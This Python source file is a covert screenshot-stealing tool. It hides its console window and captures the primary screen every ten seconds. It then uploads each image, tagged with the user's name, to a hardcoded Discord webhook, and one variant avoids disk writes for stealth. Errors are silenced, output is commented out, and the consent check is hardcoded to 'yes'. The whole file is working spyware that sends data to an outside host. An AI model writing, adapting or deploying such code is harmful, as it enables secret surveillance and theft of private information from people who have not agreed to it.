import os
import time
import io
import threading
import requests
from datetime import datetime
import mss
import mss.tools
from PIL import Image
import tempfile
import shutil
import atexit
import sys
import keyboard
import getpass


UserName = getpass.getuser()

class StealthScreenshotCapture:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.interval = 10  # seconds
        self.running = True
        self.screenshot_count = 0
        
        # Create a temporary directory that will be deleted on exit
        self.temp_dir = tempfile.mkdtemp(prefix='screenshot_temp_')
        
        # Register cleanup on exit
        atexit.register(self.cleanup)
        
        # Try to hide console window (Windows)
        self.hide_console()
    
    def hide_console(self):
        """Hide console window (Windows only)"""
        try:
            if os.name == 'nt':
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def cleanup(self):
        """Clean up temporary directory"""
        try:
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
                #print(f"Cleaned up temporary directory: {self.temp_dir}")
        except:
            pass
    
    def capture_screenshot(self):
        """Capture screenshot using mss (fast and silent)"""
        try:
            with mss.mss() as sct:
                # Capture primary monitor
                monitor = sct.monitors[1]  # Primary monitor
                
                # Capture screenshot directly to memory
                screenshot = sct.grab(monitor)
                
                # Convert to PIL Image
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                
                return img
        except Exception as e:
            #print(f"Error capturing screenshot: {e}")
            return None
    
    def compress_image(self, image, max_size=1280, quality=75):
        """Compress image to reduce file size and memory usage"""
        # Resize if too large
        if max(image.size) > max_size:
            ratio = max_size / max(image.size)
            new_size = (int(image.size[0] * ratio), int(image.size[1] * ratio))
            image = image.resize(new_size, Image.Resampling.LANCZOS)
        
        # Compress to memory (not disk)
        img_bytes = io.BytesIO()
        image.save(img_bytes, format='JPEG', quality=quality, optimize=True)
        img_bytes.seek(0)
        
        return img_bytes
    
    def send_to_discord(self, image):
        """Send screenshot to Discord and delete immediately"""
        if not image:
            return
        
        temp_file = None
        
        try:
            # Compress image in memory
            img_bytes = self.compress_image(image)
            
            # Prepare timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Create a temporary file that will be auto-deleted
            with tempfile.NamedTemporaryFile(suffix='.jpg', delete=True) as tmp_file:
                # Write to temp file
                tmp_file.write(img_bytes.getvalue())
                tmp_file.flush()
                
                # Send to Discord
                with open(tmp_file.name, 'rb') as f:
                    files = {
                        'file': (f'screenshot_{timestamp.replace(":", "-")}.jpg', f, 'image/jpeg')
                    }
                    
                    data = {
                        'content': f'**Screenshot Capture - {UserName}  - {timestamp}**'
                    }
                    
                    response = requests.post(self.webhook_url, files=files, data=data)
                
                # File is automatically deleted when exiting the with block
                
                if response.status_code == 200:
                    self.screenshot_count += 1
               
                
        except Exception as e:
            pass
        finally:
            if 'img_bytes' in locals():
                img_bytes.close()
    
    def capture_loop(self):
        """Main capture loop"""
        while self.running:
            try:
                # Capture screenshot
                screenshot = self.capture_screenshot()
                
                if screenshot:
                    # Send to Discord (auto-deletes after sending)
                    self.send_to_discord(screenshot)
                    
                    # Clear screenshot from memory
                    del screenshot
                
                # Wait for next capture
                for _ in range(self.interval):
                    if not self.running:
                        break
                    time.sleep(1)
                
            except Exception as e:
                #print(f"Error in capture loop: {e}")
                time.sleep(self.interval)
    
    def emergency_stop(self):
        """Emergency stop function"""
        self.running = False
    
    def start(self):
        
        
        # Register hotkey for emergency stop
        keyboard.add_hotkey('ctrl+shift+x', self.emergency_stop)
        
        try:
            # Start capture loop
            self.capture_loop()
        except KeyboardInterrupt:
            self.emergency_stop()
        finally:
            
            self.cleanup()

class MemoryOnlyCapture(StealthScreenshotCapture):
    #print("MOC")
    """Even more stealthy - never writes to disk at all"""
    
    def send_to_discord(self, image):
        """Send screenshot directly from memory - no disk writes"""
        if not image:
            return
        
        try:
            # Compress image in memory
            img_bytes = self.compress_image(image)
            
            # Prepare timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Send directly from memory
            files = {
                'file': (f'screenshot_{timestamp.replace(":", "-")}.jpg', 
                        img_bytes.getvalue(), 
                        'image/jpeg')
            }
            #print("Sending screenshot...")
            
            data = {
                'content': f'**Screenshot Capture - {UserName}  - {timestamp}**'
            }
            
            response = requests.post(self.webhook_url, files=files, data=data)
            
            # Close the BytesIO object
            img_bytes.close()
            
            if response.status_code == 200:
                self.screenshot_count += 1
                
            else:
                pass

        except Exception as e:
            pass

def main():
    # Configuration - REPLACE WITH YOUR WEBHOOK URL
    DISCORD_WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1476682680975491343/604yhzc0bTbGZlKcuaoRgc3nvfFykJqGqMOtZVBpzFk0PP6wSAb78XAlWQ1uDmBjTh65"
    
  
    
    consent = 'yes'
    
    if consent == 'yes':
        
        choice = '2'
        
        if choice == '2':
            capturer = MemoryOnlyCapture(DISCORD_WEBHOOK_URL)
            
        else:
            capturer = StealthScreenshotCapture(DISCORD_WEBHOOK_URL)
            
        
        try:
            capturer.start()
        except Exception as e:
            pass
        finally:
            pass 
      
    else:
        #print("You must have permission to run this tool.")
        sys.exit(1)

if __name__ == "__main__":
    # Check if required modules are installed
    required_modules = ['mss', 'PIL', 'requests', 'keyboard']
    missing_modules = []
    
    for module in required_modules:
        try:
            if module == 'PIL':
                import PIL
            else:
                __import__(module)
        except ImportError:
            missing_modules.append(module)
    
    if missing_modules:
        #print(f"Missing required modules: {', '.join(missing_modules)}")
        #print("Install with: pip install mss pillow requests keyboard")
        sys.exit(1)
    
    main()